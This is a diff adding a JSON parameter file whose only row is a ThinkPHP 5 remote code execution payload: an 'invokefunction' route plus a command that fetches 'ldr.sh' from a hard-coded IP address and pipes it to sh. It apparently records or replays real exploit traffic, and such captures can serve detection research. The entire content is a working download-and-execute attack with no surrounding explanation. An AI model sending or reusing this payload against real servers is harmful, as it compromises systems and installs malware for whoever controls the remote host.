@@ -1,0 +1,18 @@
+{
+ "parameters": [
+  {
+   "name": "s",
+   "uuid": "9cc9a0e8-820e-474e-a176-b7793865dffc"
+  },
+  {
+   "name": "vars_0_",
+   "uuid": "b4f53043-7ab5-46f3-813f-7fb74de0059c"
+  }
+ ],
+ "rows": [
+  {
+   "s": "/Index/\\think\\app/invokefunction",
+   "vars_0_": "curl --user-agent curl_tp5 http://31.210.20.181/ldr.sh|sh"
+  }
+ ]
+}
